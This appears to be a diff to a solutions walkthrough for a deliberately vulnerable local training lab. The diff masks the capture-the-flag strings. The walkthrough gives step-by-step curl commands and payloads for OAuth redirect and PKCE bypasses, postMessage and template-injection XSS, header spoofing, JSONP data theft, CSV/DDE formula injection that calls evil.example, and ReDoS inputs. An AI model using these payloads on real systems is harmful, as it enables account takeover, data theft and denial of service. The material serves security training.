 1. `curl http://localhost:3000/crypto/keyjs/app.js` and read the key: `const ENCRYPTION_KEY = 'PenTrixKey2026!!';` (16 bytes, hardcoded in the served bundle).
 2. Copy the ciphertext hex from `<code id="ct">` on `/crypto/keyjs`. The first 16 bytes are the IV. Decrypt AES-128-CBC with the stolen key, e.g. in Node:
    `crypto.createDecipheriv('aes-128-cbc', Buffer.from('PenTrixKey2026!!'), iv)`.
    The note decrypts to `Vault combination: 04-17-2026. Do not share.`
-3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{crypto_crypto-key-in-js}`.
+3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{...}`.
 Why it works: a key shipped to the browser is public to every visitor, and with the IV prepended to the ciphertext anyone can decrypt the "client-side encrypted" note offline.
 ---
 
 ## oauth – OAuth Flaws
 
-**1. Redirect URI Prefix Bypass** – `PENTRIX{oauth_redirect-bypass}`
+**1. Redirect URI Prefix Bypass** – `PENTRIX{...}`
 
 1. Log in to the IdP as alice: `GET /oauth/login/alice`.
 2. Open the authorization URL with an attacker-controlled redirect URI that still
@@ -2466,7 +2468,7 @@ Why it works: redirect validation uses a naive string-prefix check instead of an
 exact match against the registered URI, so `http://app.pentrix.lab.evil.com/cb`
 passes and the code leaves for the attacker host.
 
-**2. Authorization Code Leaked in Server Log** – `PENTRIX{oauth_code-leak}`
+**2. Authorization Code Leaked in Server Log** – `PENTRIX{...}`
 
 1. Open `GET /oauth/idp/log`. Every issued code is written there in clear, and a
    recent login by alice is pre-seeded. Copy her code, e.g.
@@ -2475,12 +2477,12 @@ passes and the code leaves for the attacker host.
    ```
    curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<alice-code>" http://localhost:3111/oauth/idp/token
    ```
-   Response contains `access_token` and `flag: PENTRIX{oauth_code-leak}`.
+   Response contains `access_token` and `flag: PENTRIX{...}`.
    (`pentrix-spa` is a public client, so no secret is needed.)
 Why it works: codes are secrets, but the IdP logs them to a world-readable log,
 and the token endpoint accepts a code whose owner differs from the requester.
 
-**3. Login CSRF (Missing state Parameter)** – `PENTRIX{oauth_no-state}`
+**3. Login CSRF (Missing state Parameter)** – `PENTRIX{...}`
 
 1. As the attacker, log in to the IdP as bob and open
    `GET /oauth/no-state/attacker`. It mints a code for bob's account and prints
@@ -2489,14 +2491,14 @@ and the token endpoint accepts a code whose owner differs from the requester.
    ```
    curl -b jar-alice -c jar-alice "http://localhost:3111/oauth/client/callback?code=<bob-code>"
    ```
-   The response shows `PENTRIX{oauth_no-state}` and explains that the client
+   The response shows `PENTRIX{...}` and explains that the client
    session is now bob while the IdP session is alice: alice is logged in to the
    client **as the attacker**.
 Why it works: the client callback exchanges any `code` it is given and never
 validates a `state` parameter, so an attacker-minted code silently logs the
 victim in under the attacker's account.
 
-**4. Implicit Flow Token in URL Fragment** – `PENTRIX{oauth_implicit}`
+**4. Implicit Flow Token in URL Fragment** – `PENTRIX{...}`
 
 1. As the victim (alice), run the implicit flow and approve it:
    ```
@@ -2515,12 +2517,12 @@ victim in under the attacker's account.
    ```
    curl "http://localhost:3111/oauth/idp/userinfo?access_token=<tok>"
    ```
-   Response contains `flag: PENTRIX{oauth_implicit}`.
+   Response contains `flag: PENTRIX{...}`.
 Why it works: the implicit flow puts the access token in the URL fragment, and
 fragments are kept in browser history, so anyone who can read the history owns
 the token and the IdP accepts it regardless of who presents it.
 
-**5. Scope Tampering** – `PENTRIX{oauth_scope-upgrade}`
+**5. Scope Tampering** – `PENTRIX{...}`
 
 1. As bob (a plain user), authorize with a scope you were never granted:
    ```
@@ -2532,11 +2534,11 @@ the token and the IdP accepts it regardless of who presents it.
    curl -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
    curl "http://localhost:3111/oauth/idp/admin-data?access_token=<tok>"
    ```
-   Response contains the admin secret and `flag: PENTRIX{oauth_scope-upgrade}`.
+   Response contains the admin secret and `flag: PENTRIX{...}`.
 Why it works: the authorize endpoint takes `scope` from the request and grants
 whatever is asked for without checking the user's role.
 
-**6. Client Secret in Public JavaScript** – `PENTRIX{oauth_secret-in-js}`
+**6. Client Secret in Public JavaScript** – `PENTRIX{...}`
 
 1. Download the public bundle: `GET /oauth/client/app.js`. It contains the
    confidential client's secret in clear:
@@ -2549,12 +2551,12 @@ whatever is asked for without checking the user's role.
    ```
    curl -b jar-bob -X POST --data "client_id=pentrix-client&client_secret=sk_live_9f2c7b41d8e0a5c6&code=<code>" http://localhost:3111/oauth/idp/token
    ```
-   Response contains `flag: PENTRIX{oauth_secret-in-js}`.
+   Response contains `flag: PENTRIX{...}`.
 Why it works: a "confidential" client's secret is shipped to every browser in
 the public JavaScript bundle, so it is not secret at all and anyone can
 complete the confidential-client exchange.
 
-**7. Authorization Code Replay** – `PENTRIX{oauth_code-replay}`
+**7. Authorization Code Replay** – `PENTRIX{...}`
 
 1. As bob, authorize `pentrix-spa` (`response_type=code`) and approve; copy the code.
 2. Exchange the same code twice:
@@ -2563,11 +2565,11 @@ complete the confidential-client exchange.
    curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
    ```
    Both responses return valid, different access tokens; the second response
-   contains `flag: PENTRIX{oauth_code-replay}`.
+   contains `flag: PENTRIX{...}`.
 Why it works: the IdP counts code uses but never invalidates them, so a
 single-use code stays valid forever.
 
-**8. PKCE Downgrade** – `PENTRIX{oauth_pkce-skip}`
+**8. PKCE Downgrade** – `PENTRIX{...}`
 
 1. As bob, authorize with a code challenge:
    ```
@@ -2578,7 +2580,7 @@ single-use code stays valid forever.
    ```
    curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
    ```
-   Response contains a valid token and `flag: PENTRIX{oauth_pkce-skip}`.
+   Response contains a valid token and `flag: PENTRIX{...}`.
 Why it works: the IdP records the challenge but the token endpoint never
 requires the verifier, so PKCE provides no binding at all.
 
@@ -2587,7 +2589,7 @@ requires the verifier, so PKCE provides no binding at all.
 
 ## postmsg – postMessage Flaws
 
-**1. No Origin Check on Message Handler** – `PENTRIX{postmsg_no-check}`
+**1. No Origin Check on Message Handler** – `PENTRIX{...}`
 
 1. Open `/postmsg/no-check/attacker` in the browser.
 2. Click "Fire payload". The attacker page runs:
@@ -2600,7 +2602,7 @@ requires the verifier, so PKCE provides no binding at all.
 Why it works: the `message` listener trusts any sender and renders the payload
 as HTML, so any website can inject markup (and scripts) into the victim page.
 
-**2. Secret Leaked via Wildcard targetOrigin** – `PENTRIX{postmsg_wildcard}`
+**2. Secret Leaked via Wildcard targetOrigin** – `PENTRIX{...}`
 
 1. Open `/postmsg/wildcard/attacker` in the browser. It embeds the victim
    widget in an iframe.
@@ -2612,7 +2614,7 @@ as HTML, so any website can inject markup (and scripts) into the victim page.
 Why it works: `targetOrigin '*'` broadcasts the secret to every embedding page,
 including a malicious one, which just listens and forwards it.
 
-**3. Unsanitized Message Data Rendered as HTML** – `PENTRIX{postmsg_data-xss}`
+**3. Unsanitized Message Data Rendered as HTML** – `PENTRIX{...}`
 
 1. Open `/postmsg/data-xss/attacker` in the browser.
 2. Click "Fire payload". The attacker page posts an object, not a string:
@@ -2625,7 +2627,7 @@ including a malicious one, which just listens and forwards it.
 Why it works: message data is rendered as raw HTML with no sanitization, so an
 object-shaped message becomes live markup in the victim page.
 
-**4. Substring Origin Check Bypass** – `PENTRIX{postmsg_substring}`
+**4. Substring Origin Check Bypass** – `PENTRIX{...}`
 
 1. Open `/postmsg/substring/attacker`. The victim checks
    `originToTest.includes('pentrix.lab')`, so an attacker domain containing that
@@ -2639,7 +2641,7 @@ object-shaped message becomes live markup in the victim page.
 Why it works: a substring match instead of an exact comparison lets
 `https://pentrix.lab.evil.com` ride on the trusted string `pentrix.lab`.
 
-**5. Privileged Action via Forged Message** – `PENTRIX{postmsg_csrf-action}`
+**5. Privileged Action via Forged Message** – `PENTRIX{...}`
 
 1. Open `/postmsg/csrf-action/attacker` in the browser. It embeds the victim's
    account settings page.
@@ -2661,7 +2663,7 @@ through postMessage.
 
 ## csti – Client-Side Template Injection
 
-**1. Basic Template Evaluation** – `PENTRIX{csti_basic}`
+**1. Basic Template Evaluation** – `PENTRIX{...}`
 
 1. Open `/csti/basic` and save a greeting containing an expression, e.g.
    `Hello {{7*7}}!`.
@@ -2671,7 +2673,7 @@ Why it works: `{{ expression }}` is compiled with `Function` and executed, so
 any arithmetic (or JavaScript) inside the delimiters evaluates in the victim's
 browser.
 
-**2. Filter Bypass via Alternative Delimiter** – `PENTRIX{csti_filter-bypass}`
+**2. Filter Bypass via Alternative Delimiter** – `PENTRIX{...}`
 
 1. Open `/csti/filter-bypass`. Submitting `{{7*7}}` is rejected with
    "Blocked by the filter" (the server refuses any template containing `{{`
@@ -2683,7 +2685,7 @@ Why it works: the blacklist is server-side and only knows `{{ }}`, while the
 client-side engine evaluates `[[ ]]` too, so the filter and the engine disagree
 about what is a template.
 
-**3. Constructor Breakout to Code Execution** – `PENTRIX{csti_constructor}`
+**3. Constructor Breakout to Code Execution** – `PENTRIX{...}`
 
 1. Open `/csti/constructor`. Every expression can see `constructor` (which is
    `Object`), and `Object.constructor` is `Function`, so a template can compile
@@ -2700,7 +2702,7 @@ Why it works: exposing `constructor` in the expression scope hands out `Function
 turning template evaluation into arbitrary JavaScript execution in the victim's
 browser.
 
-**4. CSTI Inside an HTML Attribute** – `PENTRIX{csti_attr}`
+**4. CSTI Inside an HTML Attribute** – `PENTRIX{...}`
 
 1. Open `/csti/attr` and save `{{7*7}}` as the badge text. View source: the
    server entity-encodes it into the `value` attribute.
@@ -2711,7 +2713,7 @@ Why it works: server-side entity encoding only changes how the bytes look in
 HTML source; `getAttribute` decodes them back, and encoding never stopped the
 client-side engine from evaluating the template.
 
-**5. Stored Template in Profile Name** – `PENTRIX{csti_stored}`
+**5. Stored Template in Profile Name** – `PENTRIX{...}`
 
 1. Open `/csti/stored` and save `{{7*7}}` as a display name. It is stored in the
    database (`csti_profiles`) and rendered on every view.
@@ -2723,7 +2725,7 @@ the injection persists and fires for every visitor, not just the attacker.
 
 ## http – HTTP Layer Flaws
 
-**1. CRLF Log Injection** – `PENTRIX{http_crlf-log}`
+**1. CRLF Log Injection** – `PENTRIX{...}`
 
 1. Inject CR/LF bytes via the tracked ref parameter:
    `curl "http://localhost:3112/http/track?ref=homepage%0d%0a2026-10-02T00:00:00.000Z%20FAKE%20admin%20login%20from%2010.9.9.9"`
@@ -2735,7 +2737,7 @@ Why it works: the raw ref value, CR/LF bytes included, is written to the
 access log with no sanitization, so `%0d%0a` splits one entry into two, and
 the log viewer renders the injected HTML raw.
 
-**2. HTTP Method Override** – `PENTRIX{http_method-override}`
+**2. HTTP Method Override** – `PENTRIX{...}`
 
 1. The inventory page (`/http/items`) only offers "request deletion" buttons
    that POST and delete nothing.
@@ -2748,7 +2750,7 @@ Why it works: the app rewrites `req.method` from the `_method` body
 parameter, so a plain POST is routed to the DELETE handler the UI never
 exposes.
 
-**3. Verb Tampering** – `PENTRIX{http_verb-tamper}`
+**3. Verb Tampering** – `PENTRIX{...}`
 
 1. The feedback form posts to `/http/feedback` and the page says POST-only.
 2. Submit the same action as GET:
@@ -2759,7 +2761,7 @@ Why it works: the same handler is registered for both GET and POST, so the
 "POST-only" endpoint performs its state change over GET too (bookmarkable,
 loggable, CSRF-able).
 
-**4. X-Forwarded-For Trust** – `PENTRIX{http_xff-admin}`
+**4. X-Forwarded-For Trust** – `PENTRIX{...}`
 
 1. `curl http://localhost:3112/http/internal` returns 403.
 2. Add the header yourself:
@@ -2769,7 +2771,7 @@ loggable, CSRF-able).
 Why it works: admin access is granted from the client-controlled
 `X-Forwarded-For` header, which any client can set to `127.0.0.1`.
 
-**5. Cache Deception** – `PENTRIX{http_cache-deception}`
+**5. Cache Deception** – `PENTRIX{...}`
 
 1. Purge the demo cache: open `http://localhost:3112/http/cache-purge`.
 2. As the victim: open `http://localhost:3112/http/cache-login?user=alice`,
@@ -2784,7 +2786,7 @@ Why it works: the naive cache is keyed on the URL path only, so the victim's
 personalized response (sent with `Cache-Control: public, max-age=3600`) is
 served to every later visitor.
 
-**6. Referer-Based Auth** – `PENTRIX{http_referer-auth}`
+**6. Referer-Based Auth** – `PENTRIX{...}`
 
 1. `curl http://localhost:3112/http/hidden` returns 403.
 2. Send your own Referer:
@@ -2797,7 +2799,7 @@ the substring `/trusted`, which any client can supply.
 
 ## jsonp – JSONP Injection
 
-**1. Callback XSS** – `PENTRIX{jsonp_callback-xss}`
+**1. Callback XSS** – `PENTRIX{...}`
 
 1. `curl -i "http://localhost:3112/jsonp/user?callback=alert(1)//"`
 2. The body is `alert(1)//({"user":"alice","role":"user"});` served as
@@ -2806,7 +2808,7 @@ the substring `/trusted`, which any client can supply.
 Why it works: the callback name is reflected into executable JavaScript with
 no validation, so it breaks out of the function-call context.
 
-**2. JSONP Data Theft** – `PENTRIX{jsonp_csrf-data}`
+**2. JSONP Data Theft** – `PENTRIX{...}`
 
 1. While "logged in", visit `http://localhost:3112/jsonp/attacker` in the
    browser. The page's `<script src="/jsonp/data?callback=steal">` pulls the
@@ -2818,7 +2820,7 @@ no validation, so it breaks out of the function-call context.
 Why it works: sensitive data served as JSONP is readable cross-origin by any
 site that can get the victim to load a script tag.
 
-**3. Callback Filter Bypass** – `PENTRIX{jsonp_filter-bypass}`
+**3. Callback Filter Bypass** – `PENTRIX{...}`
 
 1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
 2. Rebuild it at runtime (URL-encoded):
@@ -2829,7 +2831,7 @@ site that can get the victim to load a script tag.
 Why it works: the blocklist only bans the literal word "alert", but string
 concatenation rebuilds it at runtime where the filter never looks.
 
-**4. Array Constructor Hijack** – `PENTRIX{jsonp_array-hijack}`
+**4. Array Constructor Hijack** – `PENTRIX{...}`
 
 1. Visit `http://localhost:3112/jsonp/array-attacker` in the browser. The
    page saves the real `Array`, overrides the global constructor, loads
@@ -2842,7 +2844,7 @@ Why it works: the legacy endpoint builds its JSONP with `new Array(...)`,
 so a page that overrides the global `Array` constructor before loading the
 feed intercepts every element (the classic 2007 hijack).
 
-**5. JSONP MIME Sniffing** – `PENTRIX{jsonp_mimetype}`
+**5. JSONP MIME Sniffing** – `PENTRIX{...}`
 
 1. `curl -i "http://localhost:3112/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
 2. The response is `Content-Type: text/html` with
@@ -2855,35 +2857,35 @@ the callback executes when the URL is visited directly or framed.
 
 ## formula – CSV Formula Injection
 
-**1. Classic Formula Injection** – `PENTRIX{formula_formula-csv}`
+**1. Classic Formula Injection** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode "name==cmd|'/c calc'!A0" --data-urlencode "note=classic" http://localhost:3112/formula/add`
 then `curl -i http://localhost:3112/formula/export.csv` shows the raw
-`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{formula_formula-csv}`.
+`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{...}`.
 
 Why it works: cells are CSV-quoted but never neutralized, so a leading `=`
 reaches the spreadsheet as a live formula.
 
-**2. DDE Command Execution** – `PENTRIX{formula_formula-dde}`
+**2. DDE Command Execution** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name==DDE("cmd";"/c calc";"!A0")' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-dde}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: the `=DDE(...)` function form survives quoting and asks an
 external application to run the command when the sheet opens.
 
-**3. HYPERLINK Exfiltration** – `PENTRIX{formula_formula-hyperlink}`
+**3. HYPERLINK Exfiltration** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name==HYPERLINK("http://evil.example","click me")' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-hyperlink}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: `HYPERLINK` renders an attacker URL behind an innocent label
 and can be combined with cell references to leak neighboring data.
 
-**4. Pipe Prefix (LibreOffice)** – `PENTRIX{formula_formula-pipe}`
+**4. Pipe Prefix (LibreOffice)** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name=|/usr/bin/xcalc' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-pipe}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
 variant, and it reaches the export unsanitized like the rest.
@@ -2891,7 +2893,7 @@ variant, and it reaches the export unsanitized like the rest.
 
 ## redos – ReDoS
 
-**1. Catastrophic Email Regex** – `PENTRIX{redos_redos-email}`
+**1. Catastrophic Email Regex** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/email?email=$(python3 -c "print('a'*30+'!'")"`
 (30 a's followed by `!`, no `@` anywhere). Takes several seconds; the flag
@@ -2900,7 +2902,7 @@ is shown on the result page.
 Why it works: the nested quantifier `((...+)+)` in the local part tries every
 way to partition the 30-character run before failing on the missing `@`.
 
-**2. Nested Quantifier Username** – `PENTRIX{redos_redos-username}`
+**2. Nested Quantifier Username** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/username?username=$(python3 -c "print('a'*27+'!'")"`
 (27 a's followed by `!`). Takes several seconds; the flag is shown.
@@ -2908,7 +2910,7 @@ way to partition the 30-character run before failing on the missing `@`.
 Why it works: the textbook catastrophic pattern `^(a+)+$` backtracks over
 every partition of the a-run before the trailing `!` fails the match.
 
-**3. Catastrophic URL Regex** – `PENTRIX{redos_redos-url}`
+**3. Catastrophic URL Regex** – `PENTRIX{...}`
 
 `time curl --get --data-urlencode "url=$(python3 -c "print('http://example.com/'+'a/'*12+'!'")"` http://localhost:3112/redos/url`
 Takes several seconds; the flag is shown.
@@ -2916,7 +2918,7 @@ Takes several seconds; the flag is shown.
 Why it works: the nested quantifiers `([\/\w .-]*)*` in the path group
 explode when a long repeated path ends with a character the pattern rejects.
 
-**4. Regex Injection Search** – `PENTRIX{redos_redos-search}`
+**4. Regex Injection Search** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/search?q=a"`
 The query is compiled to `^((a)+)+$` and tested against a fixed haystack of
